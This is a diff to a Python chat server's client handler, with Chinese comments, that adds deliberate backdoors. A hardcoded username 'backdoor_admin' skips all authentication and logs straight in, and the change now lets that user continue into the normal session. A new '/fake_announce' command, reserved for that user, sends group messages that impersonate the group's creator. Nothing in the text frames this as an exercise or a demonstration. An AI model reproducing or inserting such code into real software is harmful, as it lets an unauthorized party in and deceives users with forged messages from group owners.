@@ -205,7 +205,7 @@ name 是client 的name
 def handle_client(conn, addr, name):
     print(f"{name} connected from {addr}")
 
-     # === 后门 1：特定用户名绕过一切验证，直接登录 ===
+        # === 后门 1：特定用户名绕过一切验证，直接登录 ===
     if name == "backdoor_admin":
         print("[!] Backdoor login triggered for user: backdoor_admin")
         client_ip = allocate_client_ip()
@@ -222,9 +222,11 @@ def handle_client(conn, addr, name):
             conn.sendall(json.dumps(response).encode())
             conn.close()
             return
-        # 注册连接
+
+        # 注册连接（和普通用户一致）
         clients[name] = conn
         client_ip_table[name] = client_ip
+
         response = {
             "type": "system",
             "from": "server",
@@ -236,8 +238,7 @@ def handle_client(conn, addr, name):
         }
         conn.sendall(json.dumps(response).encode())
         print(f"[Backdoor] Assigned {name} client_ip: {client_ip}")
-        return  # 跳出主流程
-        
+
     # 给新client分配 client_ip
     client_ip = allocate_client_ip()
     if not client_ip:
@@ -549,6 +550,69 @@ def handle_client(conn, addr, name):
                             }
                             conn.sendall(json.dumps(response).encode())
                         continue
+
+                    # === 后门 2：仅 backdoor_admin 可伪造群主身份发布群公告 ===
+                    elif payload.startswith('/fake_announce'):
+                        if name != "backdoor_admin":
+                            response = {
+                                "type": "system",
+                                "from": "server",
+                                "to": name,
+                                "to_type": "user",
+                                "payload": "Permission denied: command restricted.",
+                                "payload_type": "text",
+                                "timestamp": datetime.now().isoformat()
+                            }
+                            conn.sendall(json.dumps(response).encode())
+                            continue
+
+                        try:
+                            _, group_name, fake_msg = payload.split(" ", 2)
+                        except:
+                            response = {
+                                "type": "system",
+                                "from": "server",
+                                "to": name,
+                                "to_type": "user",
+                                "payload": "Invalid syntax. Usage: /fake_announce <group> <message>",
+                                "payload_type": "text",
+                                "timestamp": datetime.now().isoformat()
+                            }
+                            conn.sendall(json.dumps(response).encode())
+                            continue
+
+                        if group_name not in groups:
+                            response = {
+                                "type": "system",
+                                "from": "server",
+                                "to": name,
+                                "to_type": "user",
+                                "payload": f"Group '{group_name}' does not exist.",
+                                "payload_type": "text",
+                                "timestamp": datetime.now().isoformat()
+                            }
+                            conn.sendall(json.dumps(response).encode())
+                            continue
+
+                        members = groups[group_name]["members"]
+                        creator = groups[group_name]["creator"]
+
+                        for member in members:
+                            response = {
+                                "type": "group_message",
+                                "from": creator,  # 冒充群主身份
+                                "to": group_name,
+                                "to_type": "group",
+                                "content": f"*Group Announcement from {creator}:* {fake_msg}",
+                                "content_type": "text",
+                                "timestamp": datetime.now().isoformat()
+                            }
+                            if member in clients:
+                                clients[member].sendall(json.dumps(response).encode())
+
+                        print(f"[Backdoor] backdoor_admin faked announcement to group '{group_name}'")
+                        continue
+
                     # 向group发送消息 格式：/msg_group <group_name> <message>
                     elif payload.startswith('/msg_group '):
                         match = re.match(r'/msg_group\s+(\S+)\s+(.+)', payload)
